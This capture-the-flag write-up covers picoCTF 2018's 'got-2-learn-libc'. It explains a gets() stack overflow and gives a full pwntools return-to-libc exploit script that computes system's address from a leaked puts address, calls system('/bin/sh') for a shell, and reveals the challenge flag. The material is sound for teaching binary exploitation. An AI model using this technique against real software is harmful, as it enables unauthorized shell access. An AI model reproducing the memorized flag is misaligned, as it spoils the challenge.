# got-2-learn-libc
## Question
> This [program](files/vuln) gives you the address of some system calls. Can you get a shell? You can find the program in `/problems/got-2-learn-libc_4_526cc290dde8d914a30538d3d0ac4ef1` on the shell server. [Source](files/vuln.c). 

## Hint
>try returning to systems calls to leak information

>don't forget you can always return back to `main()`

# Solution
## Code Analysis

The `main` function displays addresses of some functions of the `libc` library (running the program several times, you can see that these address are changing, due to ASLR) and jumps to the `vuln` function:
```c
int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  puts("Here are some useful addresses:\n");

  printf("puts: %p\n", puts);
  printf("fflush %p\n", fflush);
  printf("read: %p\n", read);
  printf("write: %p\n", write);
  printf("useful_string: %p\n", useful_string);

  printf("\n");
  
  vuln();

  
  return 0;
}
```

The `vuln` function sets a buffer of 148 bytes (we will obviously need to overflow it), asks for a string and displays it.
```c
#define BUFSIZE 148

// ...
// [SNIP]
// ...

void vuln(){
  char buf[BUFSIZE];
  puts("Enter a string:");
  gets(buf);
  puts(buf);
  puts("Thanks! Exiting now...");
}
```

Interestingly, we are also provided with the string `/bin/sh` which will be in the stack, and stored in the `useful_string` variable:
```c
char useful_string[16] = "/bin/sh"; /* Maybe this can be used to spawn a shell? */
```

## return-to-libc attack
As the title suggests, we will use a return-to-libc attack, which consists of finding the `system` function in memory to call our shell via the `useful_string` already available. We can use `gdb` on the server directly to determine the address of `puts` and `system` to compute an offset that we will use later (during runtime, we'll determine the real address of `system` based on the disclosed address of `puts`):

~~~~
$ gdb -q /problems/got-2-learn-libc_4_526cc290dde8d914a30538d3d0ac4ef1/vuln
Reading symbols from /problems/got-2-learn-libc_4_526cc290dde8d914a30538d3d0ac4ef1/vuln...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x812
(gdb) r
Starting program: /problems/got-2-learn-libc_4_526cc290dde8d914a30538d3d0ac4ef1/vuln 

Breakpoint 1, 0x56565812 in main ()
(gdb) p puts
$1 = {<text variable, no debug info>} 0xf7665140 <puts>
(gdb) p system
$2 = {<text variable, no debug info>} 0xf7640940 <system>
~~~~

## Build our script

```python
#!/usr/bin/env python
import pwn
import re

# In GDB
gdb_puts = 0xf7665140
gdb_system = 0xf7640940
offset = gdb_puts - gdb_system

#elf = pwn.ELF('./vuln')
elf = pwn.ELF('/problems/got-2-learn-libc_4_526cc290dde8d914a30538d3d0ac4ef1/vuln')
p = elf.process()
output = p.recv()

# runtime memory addresses
mem_puts          = int(re.findall('puts: (.*)', output)[0], 16)
mem_useful_string = int(re.findall('useful_string: (.*)', output)[0], 16)
# retrieve real address of system
mem_system = mem_puts - offset

# execute system('/bin/sh')
payload  = 'A'*160                    # buffer overflow
payload += pwn.p32(mem_system)        # system
payload += 'B'*4                      # return address
payload += pwn.p32(mem_useful_string) # /bin/sh

p.sendline(payload)
p.interactive()
```
## Execute the script on the server

Copy the [script](files/flag.py) to your home directory and execute it
~~~~
$ python2 flag.py 
[*] '/problems/got-2-learn-libc_4_526cc290dde8d914a30538d3d0ac4ef1/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/problems/got-2-learn-libc_4_526cc290dde8d914a30538d3d0ac4ef1/vuln': pid 3449587
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@\x19Zï¿½BBBB0`\V
Thanks! Exiting now...
$ cd /problems/got-2-learn-libc_4_526cc290dde8d914a30538d3d0ac4ef1/
$ ls
flag.txt  vuln    vuln.c
$ cat flag.txt
picoCTF{syc4al1s_4rE_uS3fUl_88aa45fa}$ 
[*] Stopped process '/problems/got-2-learn-libc_4_526cc290dde8d914a30538d3d0ac4ef1/vuln' (pid 3449587)
sdam@pico-2018-shell:~$ 
~~~~

# Flag
`picoCTF{syc4al1s_4rE_uS3fUl_88aa45fa}`
